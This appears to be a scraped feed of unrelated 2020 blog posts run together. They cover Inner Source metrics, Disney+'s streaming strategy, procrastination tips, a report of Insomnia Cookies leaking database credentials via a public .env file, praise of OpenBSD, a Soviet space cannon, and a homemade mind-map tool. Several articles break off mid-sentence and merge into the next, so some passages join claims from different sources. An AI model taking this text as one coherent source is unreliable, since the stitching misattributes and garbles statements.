<p>It was not until two or three years ago that I started paying attention to Inner Source. I realized that many have inherited this belief. And since they live in corporate environments, the challenge that represents convincing execution related managers is bigger than in Open Source. </p>



<p>Inner Source programs are usually supported by executives and R&amp;D departments but receive resistance from middle management, especially those closer to execution units. Collaborating with other departments might be good in the long term but it is perceived as less productive than developing in isolation. Somehow, in order to participate in Inner Source programs, they see themselves choosing between shorter-term and longer-term goals, between their incentives and those of the executives. It has little to do with their ability to “<em>get it</em>“.</p>



<p>So either their incentives are changed and they demonstrate that the organization can still be profitable, or you need to adapt to those incentives. What I believe is that adapting to those incentives means, in a nutshell, to provide a solid answer to the question, <em>can we go faster by going together?</em></p>



<p>The proposed solution: if you want to go far, together is faster.</p>



<p>If we could find a positive correlation between efficiency/productivity and collaboration, we could change the proverb above by something like…</p>



<div><figure><img data-attachment-id="1390" data-permalink="https://toscalix.com/the_solution/" data-orig-file="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg" data-orig-size="5658,1590" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="the_solution" data-image-description="" data-medium-file="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=300" data-large-file="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=656" src="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=1024" alt="" srcset="https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=1024 1024w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=2048 2048w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=150 150w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=300 300w, https://toscalixdotcom.files.wordpress.com/2020/11/the_solution.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>And hey, technically speaking, it would still be an African proverb, since I am from the Canary Islands, right?.</p>



<p>The idea behind the above sentence is to establish an <em>AND</em> relation between speed and collaboration meeting both, traditional corporate and Open Source (and Inner Source) goals. </p>



<p>Proving such positive correlation could be help to reduce the resistance offered by middle management to practice collaboration at scale either within Inner Source programs or Open Source projects. They would perceive such participation as a path to meet those longer term goals without contradicting many of the incentives they work with and they promote among their managees.</p>



<p>So the following question is, how we can do that? how can we provide evidences of such positive correlation in a language that is familiar to those managers?</p>



<p>The solution summarized: ISC Fall 2020</p>



<p>I tried to briefly explain to people running Inner Source programs, during the <a href="https://innersourcecommons.org/events/isc-fall-2020-agenda/">ISC Fall 2020</a>, a potential path to establish such relation in five not-so-simple steps. The core slide of my presentation enumerated them as:</p>



<p>1.- In addition to collaboration and community health metrics, I recommend to track product delivery process performance ones.<br>2.- Correlate both groups of metrics.<br>3.- Focus on decisions and actions that creates a positive correlation between them.<br>4.- Create a reporting strategy to developers and managers based on such positive correlation.<br>5.- Use such strategy to turn around your Inner Source/Open Source story: it is about creating positive business impact at scale through open collaboration.</p>



<p>A detailed explanation of these five points can be found in the second article of this series:</p>

He <a href="https://insidethemagic.net/2020/04/its-a-small-world-ride-through-rwb1/">revamped</a> it's a Small World, to include more modern characters such as Moana.</p><p>He built a licensing empire. In 2018, Disney was the <a href="https://www.hollywoodreporter.com/news/disney-repeats-as-top-global-licensor-547b-retail-sales-1229916#:~:text=The%20Walt%20Disney%20Co.'s,from%20%2453%20billion%20in%202017.">top licensor</a> in the world. It earned $54.7B in retail sales on licensed merchandise. This isn’t easy. Netflix generates little revenue on licensing. It's attempt to create Stranger Things merchandise <a href="https://www.benzinga.com/media/19/07/14034053/cnbc-netflix-sees-no-profits-from-stranger-things-collectibles">failed miserably</a>.</p><p><strong>Content is the Fuel That Powers the Machine</strong></p><p>As Walt Disney's flywheel predicted more than 50 years ago, its content was the fuel that powered the machine. A machine with <a href="https://thewaltdisneycompany.com/the-walt-disney-company-reports-fourth-quarter-and-full-year-earnings-for-fiscal-2019/">$69.57B</a> in revenue in 2019 from four business segments:</p><ul data-rte-list="default"><li><p>Media Networks</p></li><li><p>Parks Experiences and Products</p></li><li><p>Studio Entertainment</p></li><li><p>Direct to Consumer and International</p></li></ul><p>But his most important contribution to the company came at the end of his tenure—launching Disney+. Bob Iger, didn't say it at the time, but he knew Disney needed to adopt. Disney's old model was reliant on others for distributions. It's content, both old and new needed consumers. It was mediums such as Netflix or movie theatres that brought the consumers. In the long run, this content not only cost Disney money, but cost them control of their audience.</p><p>On November 8th, 2018, Disney+ was announced. This would be the distribution that Disney needed. It would own its content and its audience.</p><p>On November 12th, 2019 Disney+ launched. The first day it had 10M subscribers. A year later, Disney+ now has 73.7M subscribers. It <a href="https://deadline.com/2020/08/disney-nears-5-year-streaming-goal-in-first-eight-months-with-57-5m-subscribers-1203003841/#:~:text=After%20rising%20from%2054.5%20million,would%20get%20to%20by%202024.">predicted 60M - 90M</a> subscribers by 2024—blowing away its own projections.</p><p>Bob Chapek, CEO of Disney, agreed with the future that Bob Iger laid out. He saw the success of Disney+ and knew the world was changing. If the last decade was about building the audience, the next decade would be about retaining the audience. At the core of that would be DTC (direct to consumer). Disney <a href="https://apnews.com/press-release/business-wire/travel-business-technology-lifestyle-bob-chapek-736055c7f51f457fa534bf9b5380bf35">wrote in a statement</a> to shareholders on October 12th, 2020:</p><blockquote><p><em>"In light of the tremendous success achieved to date in the Company’s direct-to-consumer business and to further accelerate its DTC strategy, The Walt Disney Company (NYSE: DIS) today announced a strategic reorganization of its media and entertainment businesses. Under the new structure, Disney’s world-class creative engines will focus on developing and producing original content for the Company’s streaming services, as well as for legacy platforms, while distribution and commercialization activities will be centralized into a single, global Media and Entertainment Distribution organization. The new Media and Entertainment Distribution group will be responsible for all monetization of content—both distribution and ad sales—and will oversee operations of the Company’s streaming services. It will also have sole P&amp;L accountability for Disney’s media and entertainment businesses."</em></p></blockquote><p><strong>Mulan As a Barometer</strong></p><p>Disney+ is positioned differently than Netflix. I like to describe it as "Netflix for Families”. What's most impressive about the launch is the lack of original content. Disney doesn't have a plethora of content for Disney+. It's only notable show is the Mandalorian. There is also a series of one-off exclusive content that has driven growth such as Hamilton and Mulan.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605588997266_11565"><div><p>The launch of Mulan, a live-action adaptation of the 1998 movie, is a barometer for the success of DTC. Due to COVID, movie theatre revenue has sharply declined. Disney could leverage Disney+ to skip theatres and release it straight to consumers. Even better, it would keep 100% of the revenue it would earn.</p><p>Disney charged $29.99 to watch (in addition to the monthly subscription fee). It's unclear how Mulan performed. Some reports indicate revenue upward of <a href="https://www.cbr.com/mulan-estimates-disney-gamble-massive-payday/">$250MM</a> while other data suggests numbers in the <a href="https://www.ign.com/articles/did-mulans-vod-sales-beat-tenets-global-box-office">$60MM - $90MM range</a>.</p><p>Honestly, who cares? Even if Disney+ made $60M (revenue estimate 11 days after release), it doesn't tell the whole story. It doesn't give insight to the millions of new subscribers Disney+ earned. Ultimately, resulting in millions of dollars in additional revenue for the company.</p><p>And this is the point, isn't it? Disney's strategy isn't a one-off, but holistic. Every movie release isn't just one-off revenue from a movie sale, but represented by billions of dollars in recurring revenue. Even if Disney lost money on Mulan initially, it gives them more data. This helps to figure out the content people watch and how to optimize it for maximum revenue. <a href="https://www.arilewis.com/aris-posts/netflixs-biggest-competitor-is-choice">Last week, I wrote about how Netflix's algorithm saved it $1B a year</a>:</p><blockquote><p><em>"Netflix has spent millions if not billions on their recommendation algorithm.</em><a href="https://mobilesyrup.com/2017/08/22/80-percent-netflix-shows-discovered-recommendation/" target="_blank"><em> 80% of watched content</em></a><em> is based on recommended content. Netflix's former chief product officer wrote in a 2016 paper that the algorithm</em><a href="https://www.tubefilter.com/2016/06/20/netflix-recommendation-engine-algorithm/" target="_blank"><em> saves Netflix over $1B a year</em></a><em>. Netflix</em><a href="https://www.businessinsider.com/how-long-netflix-thinks-it-takes-to-choose-content-2016-2" target="_blank"><em> only has 90 seconds</em></a><em> to suggest content to a user before it leaves—underlying the importance of the algorithm."</em></p></blockquote><p>Disney's CEO, Bob Chapek, in their Q4 earnings call didn't share specific data, but announced they were "<a href="https://deadline.com/2020/11/mulan-pvod-bob-chapek-revenue-viewership-1234613878/">pleased with the results</a>".</p><p><strong>What Disney+'s Success Means?</strong></p><p>It's very rare for a behemoth like Disney not only to reinvent itself, but succeed in the way they have. Even more impressive is in the time frame in which they've done it. Disney+'s success has surpassed even the most optimistic expectations of any analyst.</p><p>Disney has spent 50+ years building some of the most iconic brands in the world. Brands such as Mickey Mouse and Snow White. It then leveraged those brands to create diversified revenue streams: merchandise, amusement parks and more.</p><p>Somewhere along the way, they got lost. Bob Iger was their guiding light and Bob Chapek drove the car that got them there.</p><p>Disney's revitalization is a lesson to all. It's not only about content, but what you do with that content. Can you distribute it? Can you monetize the IP? Ultimately, how do you create the best content that makes the most money?</p><p>I am excited for the future of Disney. I continue to remain a shareholder. It's new direct to consumer strategy is exactly what Walt Disney would have wanted: using content to fuel the flywheel. </p></div></div></div>]]>

                    <p>I often always be intimidated by my to-do list. Usually, I procrastinate, hoping post deferments I will feel better and can finish the task. It is a silly thing to do because deferment will make me feel much more horrible. I know what the issue is and how to work around it. But procrastination is always on the way and is still my default reaction.</p><p>Tackling procrastination are obvious yet not so obvious. Enough <a href="https://hn.algolia.com/?q=procrastinate">articles </a>are discussing procrastination. I put my pieces here, which some based on those existing ideas in countless articles and books. So here we go, the steps on how not to procrastinate, so that I can always refer back here if any of my current or future tasks resort to procrastination.</p><ol><li>Eat the elephant, split big tasks into smaller</li><li>Write first awful draft and iterate</li><li>Beat the resistance by just starting out</li></ol><h2 id="eat-the-elephant">Eat The Elephant</h2><p>Eat the elephant is the first step. Many tasks feel big because... it is big. Split it into manageable chunks. As one person working in software industries for more than a decade, this should be natural for me. One starts with writing <a href="https://en.wikipedia.org/wiki/User_story">a story</a>. Then define tasks to accomplish the story. Define subtasks if needed. The intuition is, an elephant is too big. You can't eat it in one swallow. But it will be edible if you eat piece by piece where you can chew it chunk by chunk. </p><p>Example: writing a thesis. The one task that I am starting. It is so big—so many tasks. I am beginning frozen. I don't know what to do first. Break the ideas of the tasks as a starter. I am starting again to use mindmap recently, and it is quite helpful in breaking up ideas and actions to take. I use <a href="http://gitmind.com/">gitmind</a>, the best of a few I have tried. Following is the very first version of my thesis mindmap. It is still big, but I can see the manageable chunks, which I can try to chew bit by bit.</p><figure><img src="http://blog.lamida.org/content/images/2020/11/image.png"></figure><p>As additional note, in conventional school, an advisor will give you manageable milestones that help you further in eating the elephant.</p><h2 id="write-the-first-awful-first-version-draft">Write The First Awful First Version Draft</h2><p>This idea is not always necessary only about writing. I often want to procrastinate because I keep hoping that I will continuously produce an excellent first version. First version awesome blog post. First version great software piece. I wish I can always create something amazing all the time, but I feel that it shouldn't be the case. I believe even some great people wouldn't always produce a masterpiece. That's why they call it a masterpiece. If a masterpiece is all over, we will not call it a masterpiece anymore.</p><p>In an article about writing that I don't remember which one is, it tells to aim to write awful writing once a day. Or, in other words, write a daily crappy writing. Accept the fact that your first output will most probably always be awful. However, do iteration based on a feedback loop. See what went well, and keep it up. See what can be improved and make small chunks of improvement. The more you do it, your first draft wouldn't be so awful anymore.</p><p>One example is this blog post. This is the first time I am writing directly in the Ghost editor without overthinking how awful my post will be. I just want to write points to clarify my thoughts to refer to again in the future.</p><h2 id="beat-the-resistance">Beat The Resistance</h2><blockquote>“If you find yourself asking yourself (and your friends), "Am I really a writer? Am I really an artist?" chances are you are. The counterfeit innovator is wildly self-confident. The real one is scared to death.”― Steven Pressfield, The War of Art: Break Through the Blocks &amp; Win Your Inner Creative Battles</blockquote><p>Even after understanding and accepting your first version (be it writing, software, work in progress task) will be awful. You need to start. To start, you need to beat what Steven Pressfield called resistance. How to beat resistance? Just start. Yes, this is cyclic. To break the cycle, you just need to start.</p><p>According to many procrastination books (sorry, I can't quote because I don't remember the specific reference), anticipating to start a task often much more difficult than actually starting the task itself.</p><p>For example, I have been procrastinating my <a href="https://istd.sutd.edu.sg/courses/mssd/machine-learning/">Machine Learning</a> homework that dues tomorrow because I just feel not good about starting for multiple reasons. I still don't understand most of the concepts in the past three lectures. I wish I can start after I know all of them. This blog post is one way for me to defer myself from doing my homework. I am pretty sure that once I start, it won't be so bad.</p><h2 id="sometime-you-just-need-to-procrastinate">Sometime You Just Need to Procrastinate</h2><p>This statement is based on a conversation with my friend. He has done his PhD and advice on tackling procrastination from PhD is always the best one.</p><blockquote>Productivity is a wave! Don't feel guilty when you are in an antinode and take care of your wellbeing when you are in a node!</blockquote><p>That's what he said referring to this twitter post.</p><!--kg-card-begin: html--><blockquote>— Dr Zoë Ayres (@ZJAyres) <a href="https://twitter.com/ZJAyres/status/1280536086322786304?ref_src=twsrc%5Etfw">July 7, 2020</a></blockquote> <!--kg-card-end: html--><p>So there is a time when one will feel not good to start. Don't feel guilty too much about it. But don't wait for the perfect starting time. Just try to start, even if you feel good a bit. It wouldn't be so bad once you start.</p><p>Post image is taken from <a href="https://unsplash.com/photos/dtSCKE9-8cI">here</a>.</p>

<p>American bakery company <em>sweetly</em> remembered for its late-night warm cookie trucks across college campuses was caught leaking sensitive data on its website.</p>



<p>The data exposed via public <code>.env</code> files included production server database credentials, including the DB server addresses, ports, usernames, passwords, and API keys.</p>



<p><code>.env</code> files contain sensitive configuration data such as environment variables, API keys, passwords, and are supposed to remain private, hidden from prying eyes of the public.</p>



<p>The exposed <em>.env</em> file provided enough information for an attacker to potentially be able to access the Insomnia Cookies database and carry all sorts of attacks, such as dropping entire databases, or illicitly obtaining the information contained within them, such as customer data.</p>



<figure><img src="https://pbs.twimg.com/media/EnC8cEWXEAE2PfB?format=jpg&amp;name=large" alt="Image"><figcaption>Source: Bob Diachenko </figcaption></figure>



<p>Bob Diachenko, Cyber Threat Intelligence researcher who discovered the flaw on November 12th via public IoT search engines (such as Shodan), responsibly reported it to Insomnia Cookies.</p>



<p>However, Diachenko didn’t receive a response. And it seems, Insomnia Cookies quietly patched the flaw following Diachenko’s report.</p>



<p>“Insomnia Cookies left almost all of their prod credentials exposed via publicly accessible dot-env file on one of its IPs (indexed by all IoT search engines). Silently secured after responsible disclosure, no response,” <a href="https://twitter.com/MayhemDayOne/status/1328769354318688257" target="_blank" rel="noreferrer noopener">tweeted</a> Diachenko.</p>



<p>Diachenko told <em>Security Report</em> he had discovered the data leak last week via public IoT search engines and immediately reported it to Insomnia Cookies:</p>



<p>“I discovered that one on Nov 12th and immediately sent alert to IC.”</p>



<p>“Basically, dot-env is environment variables file for internal usage only. Developers define here settings for databases and endpoints so if you have this, most of the company’s infrastructure is compromised,” Diachenko told <em>Security Report</em>.</p>



<p>When building and publishing websites to production environment, it may be wise to check file permissions, to prevent data leaks such as this one.</p>



<p><em>Security Report</em> has reached out to Insomnia Cookies for comment but haven’t heard back yet.</p>

  <p>In this article I will share my opinion about things I like in
OpenBSD, this may including a short rant about recent open source
practices not helping non-linux support.</p>

<h3 id="privacy">Privacy</h3>

<p>There is no telemetry on OpenBSD. It’s good for privacy, there is
nothing to turn off to disable reporting information.</p>

<p>The default system settings will prevent microphone to record sound
and the webcam can’t be accessed without user consent because the
device is root’s by default.</p>

<h3 id="securefirefoxchromium">Secure firefox / chromium</h3>

<p>While the security features added to the market dominating web
browsers <strong>can be cumbersome sometimes</strong>, this is really a game
changer compared to others systems. The web browsers should be able to
only retrieve files in a few user defined directories, like
<code>~/Downloads</code> or <code>/tmp/</code> by default and some others directories
required for the browsers to work.</p>

<p>This means your <code>~/.ssh</code>, <code>~/Documents</code> and everything else can’t be
read by an exploit in a web browser.</p>

<p>It’s possible to replicate this on Linux using AppArmor, but it’s
absolutely not out of the box and requires a lot of tweaks from the
user to get an usable Firefox. I did try, it worked but it requires a
very good understanding of the Firefox needs and AppArmor profile
syntax to get it to work.</p>

<h3 id="pffirewall">PF firewall</h3>

<p>With this firewall, I can quickly check the rules of my desktop or
server and understand what they are doing.</p>

<p>I also use a lot the bandwidth management feature to throttle the
bandwidth some programs can use which doesn’t provide any rate
limiting. This is very important to me. Linux users could use the
software <code>trickle</code> for this.</p>

<h3 id="itsstable">It’s stable</h3>

<p>Apart from the use of some funky hardware, OpenBSD has proven me being
very stable and reliable. I can easily reach two weeks of uptime on my
desktop with a few suspend/resume every day. My servers are running
24/7 without incident for years.</p>

<p>I rarely go further than two weeks on my workstation because I run
current and this means it’s time to upgrade.</p>

<h3 id="lowmaintenance">Low maintenance</h3>

<p>Keeping my OpenBSD up-to-date is very easy. I run syspatch and pkg_add
-u twice a day to keep the system up to date. A release every six
months requires a bit of work.</p>

<p>Basically, upgrading every six months looks like this, except some
specific instructions explained in the upgrade guide (database server
major upgrade for example):</p>

<pre><code># sysupgrade
[..wait..]
# pkg_add -u
# reboot
</code></pre>

<h3 id="documentationisaccurate">Documentation is accurate</h3>

<p>Setting up an OpenBSD system with full disk encryption is easy.</p>

<p>Documentation to create a router with NAT is explained step by step.</p>

<p>Every binary or configuration file have their own up-to-date man page.</p>

<p>The FAQ, the website and the man pages should contain everything one
needs. This represents a lot of information, it may not be easy to
find what you need, but it’s there.</p>

<p>If I had to be without internet for some times, I would prefer an
OpenBSD system. The embedded documentation (man pages) should help me
to achieve what I want.</p>

<p>Consider configuring a router with traffic shaping on OpenBSD and
another one with Linux without Internet access. I’d 100% prefer read
the PF man page.</p>

<h3 id="contributingiseasy">Contributing is easy</h3>

<p>This has been a hot topic recently. I very enjoy the way OpenBSD
manage the contributions. I download the sources on my system,
anywhere I want, modify it, generate a diff and I send it on the
mailing list. All of this can be done from a console with tools I
already use (git/cvs) and email.</p>

<p>There could be an entry barrier for new contributors: you may feel
people replying are not kind with you. <strong>This is not true.</strong> If you
sent a diff and received critics (reviews) of your code, this means
some people spent time to teach you how to improve your work. I do
understand some people may feel it rude, but it’s not.</p>

<p>This year I modestly contributed to the projects
<a href="https://www.openindiana.org/">OpenIndiana</a> and
<a href="https://nixos.org/">NixOS</a>, this was the opportunity to compare how
contributions are handled. Both those projects use github. The
work flow is interesting but understanding it and mastering it is
extremely complicated.</p>

<p>One has to make a github account, fork the project, create a branch,
make the changes for your contribution, commit locally, push on the
fork, use the github interface to do a merge request. This is only the
short story. On NixOS, my first attempt ended in a pull request
involving 6 months of old commits. With good documentation and
training, this could be overcome, and I think this method has some
advantages like easy continuous integration of the commits and easy
review of code, but it’s a real entry barrier for new people.</p>

<h3 id="highqualitypackages">High quality packages</h3>

<p>My opinion may be biased on this (even more than for the previous
items), but I really think OpenBSD packages quality is very high. Most
packages should work out of the box with sane defaults.</p>

<p>Packages requiring specific instructions have a README file installed
with them explaining how to setup the service or the quirks that could
happen.</p>

<p>Even if we lack some packages due to lack of contributors and time (in
addition to some packages relying too much on Linux to be easy to
port), major packages are up to date and working very well.</p>

<p>I will take the opportunity of this article to publish a complaint
toward the general trend in the Open Source.</p>

<ul>
<li><p>programs distributed only using flatpak / docker / snap are really
 Linux friendly but this is hostile to non Linux systems. They often
 make use of linux-only features and the builds systems are made for
 the linux distribution methods.</p></li>
<li><p>nodeJS programs: they are made out of hundreds or even thousands of
 libraries often working fragile even on Linux. This is a real pain
 to get them working on OpenBSD. Some node libraries embed rust
 programs, some will download a static binary and use it with no
 fallback solution or will even try to compile source code instead of
 using that library/binary from the system when installed.</p></li>
<li><p>programs using git to build: our build process makes its best to be
 clean, the dedicated build user *<em>HAS NO NETWORK ACCESS</em> and won’t
 run those git commands. There are no reasons a build system has to
 run git to download sources in the middle of the build.</p></li>
</ul>

<p>I do understand that the three items above exist because it is easy
for developers. But if you write software and publish it, that would
be very kind of you to think how it works on non-linux systems. Don’t
hesitate to ask on social medias if someone is willing to build your
software on a different platform than yours if you want to improve
support. We do love BSD friendly developers who won’t reject OpenBSD
specifics patches.</p>

<h3 id="whatiwouldliketoseeimproved">What I would like to see improved</h3>

<p>This is my own opinion and doesn’t represent the OpenBSD team members
opinions. There are some things I wish OpenBSD could improve there.</p>

<ul>
<li>Sndiod support for separates in/out devices (I have an usb
 microphone and an usb DAC and I can’t use them for audio conference)
 (<a href="https://marc.info/?l=openbsd-tech&amp;m=160562971904202&amp;w=2">a patch</a>
 was sent the next after this article was published)</li>
<li>Better ARM support</li>
<li>Wifi speed</li>
<li>Better performance (gently improving every release)</li>
<li>FFS improvements in regards to reliability (I often get files in
 lost+found)</li>
<li>Faster pkg_add -u</li>
<li>hardware video decoding/encoding support</li>
<li>better FUSE support and mount cifs/smb support</li>
<li>scaling up the contributions (more contributors and reviewers for
 ports@)</li>
</ul>

<p>I am aware of all the work required here, and I’m certainly not the
person who will improve those. This is not a complain but wishes.</p>

<p>Unfortunately, everyone knows OpenBSD features come from hard work and
not from wishes submitted to the developers :)</p>

<p>When you think how little the team is in comparison to the other
majors OS, I really think a good and efficient job is done there.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the decades since the fall of the Soviet Union, many Americans have taken to assuming that victory for the United States was assured. From our vantage point in the 21st century, we now know that the <a href="https://www.sandboxx.us/blog/the-soviet-dome-of-light-cold-war-weapon-mystery/">Soviet Union</a> was, in many ways, a quagmire of oppression and economic infeasibility — but in the early days of mankind’s effort to reach the stars, it was <em>the Soviets</em>, not the Americans, who seemed destined for the top spot.</p><p>On October 4, 1957, it was the Soviet Union that first successfully placed a manmade object in orbit around the earth, with Sputnik. Less than a month later, the Soviets would capture <a href="https://www.space.com/17764-laika-first-animals-in-space.html" target="_blank" rel="noreferrer noopener">another</a> victory: Launching a stray dog named Laika into orbit. While the dog would die as it circled our planet, Laika’s mission seemed to prove (at least to some extent) that space travel was possible for living creatures. On September 14, 1959, the Soviet space probe Luna II would be the first manmade object to land on the moon, but the Soviet’s greatest victory was yet to come.</p><h2>When the Soviets were winning the Space Race</h2><div><figure><picture>

<figcaption>Soviet Cosmonaut Yuri Gagarin (WikiMedia Commons)</figcaption></figure></div><p>On April 12, 1961, the Soviet Union once again affirmed to the world that they were the global leader in space technology, launching cosmonaut Yuri Gagarin into orbit where he remained for 108 minutes before reentering the earth’s atmosphere.</p><p>To the Americans, these early victories in the Space Race were about far more than international prestige. Each victory for the <a href="https://www.sandboxx.us/blog/how-a-teenager-with-a-cessnas-insane-trip-helped-topple-the-soviet-union/">Soviets</a> not only represented a greater lead in securing “the ultimate high ground” for the Soviet military, they also served as proof of the validity of the Soviet Communist economic and political model — making the Soviet space program as much an ideological threat as it was a military one.</p><p>Despite assuming an underdog status in the early days of the Space Race, however, the U.S. leveraged its post-World War II industrial and economic might to begin closing the gap created by these early Soviet victories, launching their own satellite less than four months after Sputnik. America’s first astronaut in space, Alan Shepard, would follow behind the Soviet Gagarin by less than a month.</p><h2>America’s come-from-behind victory</h2><div><figure><picture>

<figcaption>Buzz Aldrin on the moon (NASA)</figcaption></figure></div><p>By 1969, America’s technological prowess, coupled with a massive influx of spending, would secure victory for both the U.S. and, in the minds of many, its capitalist economic model. On July 20, 1969, two former fighter pilots, Neil Armstrong and Buzz Aldrin, triumphantly landed on the moon.</p><p>Just like that, the Soviets went from leading the way in orbital space to lagging behind, and in the midst of an ongoing nuclear arms race, the Soviets saw this shift as a significant threat. Furthering their concern were reports of the American Manned Orbital Laboratory (MOL) program, which was intended as an early space station from which crews could conduct orbital surveillance, or even mount operations against Soviet orbital bodies.</p><p>In response to the MOL program, the Soviets poured funding into Almaz, which was an early space station design of their own. Hidden behind a public-facing civilian space station effort, the program called for a number of military-specific space stations in orbit around the earth, each capable of conducting its own high-altitude reconnaissance. Although the Americans canceled their MOL program in 1969, the Soviet effort continued, reaching even further beyond America’s canceled program with plans to equip these space stations with the world’s <em>first ever cannon in space</em>.</p><h2>The Soviet Space Cannon: R-23M Kartech</h2><p>The Soviets were not mistaken when they considered America’s MOL program a threat. In fact, within the corridors of the Pentagon, a number of plans and strategies were being explored that would enable the Americans to spy on, capture, or otherwise destroy Soviet satellites.</p><p>It was with this in mind that the Soviet Union decided they’d need to equip their space stations for more than just taking pictures of the earth below. Instead, they wanted to be sure their orbital habitats could <em>fight</em> whatever the Americans threw their way.</p><div><figure><picture>

According to reports made public after the fall of the Soviet Union, the cannon successfully punctured a metal gas can from over a mile away during ground testing.</p><p>The cannon was to be mounted in a fixed position on the underbelly of the Soviet Almaz space stations, forcing operators to move the entire 20-ton station to orient the barrel toward a target. The weapon system was first <a href="https://www.wearethemighty.com/history/soviet-space-cannon-in-orbit?rebelltitem=3#rebelltitem3" target="_blank" rel="noreferrer noopener">affixed</a> to a modified Soyuz space capsule, which was then dubbed the “Salyut” space station, and launched in 1971. By the time the Salyut was in orbit, however, interest in these manned reconnaissance platforms was already beginning to wane inside the Kremlin, as unmanned reconnaissance satellites seemed more practical.</p><h2>The only cannon ever fired in space</h2><p>While American intelligence agencies were well aware of the Soviet plan to field military space stations, it was still extremely difficult to know exactly what was going on in the expanse of space above our heads. Under cover of extreme secrecy, the Soviet Union <a href="https://www.popularmechanics.com/military/weapons/a18187/here-is-the-soviet-unions-secret-space-cannon/" target="_blank" rel="noreferrer noopener">successfully</a> completed a test firing of the R-23M on Jan. 24, 1975 in orbit above the earth. There was no crew onboard at the time, and the exact results of the test remain classified to this day. Uncomfirmed reports indicate that the weapon fired between one and three bursts, with a total of 20 shells expended. In order to offset the recoil of the fired rounds, the space station engaged its thrusters, but it stands to reason that the test may have been a failure.</p><div><figure><picture>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>Since high school I've never had a paper notebook. Don't get me wrong: I'm not one or these people with very good memory and don't need any notes whatsoever. On the contrary.</p>
<p>The thing is I've never seen much value in note taking. At least in the traditional way, with paragraphs and blocks of text. I can't memorize these chunks of text and, if I want to dive deep into a subject, I'm much better off reading text books or browsing Wikipedia articles. </p>
<p>In fact, I've never trusted my own notes. Maybe I got it wrong in the first place. Maybe the way I wrote is ambiguous. Ultimately, the bigger the notes, more likely they can lead me to wrong conclusions. </p>
<h3 id="the-need">The need</h3>
<p>However, sometimes I want to refresh my memory on a particular subject and reading books and articles is too time consuming. I just want to recap the absolute essential — things I shouldn't forget. Some minimal notes surely would come in handy. </p>
<p>I researched for cheap yet effective note taking methods. I tried <a href="https://en.wikipedia.org/wiki/Cornell_Notes">Cornell notes</a> but they didn't do the trick for me. Then I tried <a href="https://en.wikipedia.org/wiki/Mind_map">mind maps</a> and I really liked it. </p>
<figure>
    <img src="https://user-images.githubusercontent.com/3226564/99436292-1389eb80-28f0-11eb-8fff-19f085e23c41.png">
    <figcaption>A typical mind map. Source: <a href="https://mindmapping.com/" target="_blank">mindmapping.com</a></figcaption>
</figure>
<p>What I fancy about mind maps is that they are extremely minimalist and favor connection of ideas. It's also possible to adjust the level of details you want to write/read by determining how deep into the nodes you want to dive. </p>
<h3 id="first-experience">First experience</h3>
<p>The first time I used mind maps for real was when I was studying for a software engineering interview in a big tech company. </p>
<p>For an Algorithm question in general you need to know beforehand what's the better strategy for solving it. Should it use a graph? Or a linked list? When faced with such a problem it isn't trivial to know how to solve it but if you ask yourself "would graphs work here?" you generally have an immediate yes/no. A mind map —either in paper or in your brain— with all the possibilities makes things much easier. </p>
<h3 id="the-objective">The objective</h3>
<p>After the good experience I had with mind maps, I decided to digitally register part of my knowledge using this method. Not only about algorithms but also Biology, History, Grammar and all these other fields I barely know a thing. </p>
<p>I established some criteria. The tool for this job should:</p>
<ol>
<li>have a very low time-wise cost for writing </li>
<li>have basic search functionality</li>
<li>have a way to connect different mind maps </li>
<li>be portable — it should work at least on my PC and my phone</li>
</ol>
<p>I didn't find any tool that fits these criteria, so I decided to build my own. That said, one additional requirement was:</p>
<ol start="5">
<li>the tool should be so simple that the time to build it should be at most a few hours — because <a href="https://denisidoro.github.io/posts/tips-for-faster-development/">I'm lazy</a></li>
</ol>
<p>This requirement made me reject some complex ideas I had that involved graph databases such as <a href="https://neo4j.com/">Neo4j</a>.</p>
<p>For writing, I went with the most simple solution possible: an indented plain text document. </p>
<pre><code><span>Kingdoms
   Animalia
   Plantae
   Arthropoda
      Insects
   Fungi
   Porifera
</span></code></pre><h3 id="the-result">The result</h3>
<p>After some work, here's what I came up with:</p>

    <figcaption>Jumping between nodes and different mind maps is easy!</figcaption>
</figure>
<p>The UI is smart enough to show any relevant info related to the root node, so the more mind maps you write that include the query, the more data the UI will be able to connect. </p>
<p>Since it uses pretty standard web technologies, it works on my phone without any hiccups. </p>

    <figcaption>The UI is fully functional on Chromium-based browsers on Android</figcaption>
</figure>
<p>I also added buttons to quickly go the dictionary definition or Wikipedia article related to the root node. </p>
<figure>
    <img src="https://user-images.githubusercontent.com/3226564/99437720-99f2fd00-28f1-11eb-9e89-f421b831e3a0.png">
    <figcaption>Clicking on the globe icon leads to the Wikipedia article that best matches "gauss"</figcaption>
</figure>
<p>It's hosted on Github Pages so you can try it out <a href="https://denisidoro.github.com/move-reminder">here</a>. </p>
<p>The app is capable of downloading mind map definitions from the web so it should work for everyone. Please refer to help section for more info.</p>
<p>Do you have suggestions for this tool? If so please open an issue in its git repo! </p>

<![CDATA[Desktop Styling with Qt Quick Controls]]>

November 17, 2020 | https://www.qt.io/blog/desktop-styling-with-qt-quick-controls | <a href="https://web.archive.org/web/*/https://www.qt.io/blog/desktop-styling-with-qt-quick-controls">archive.org</a>
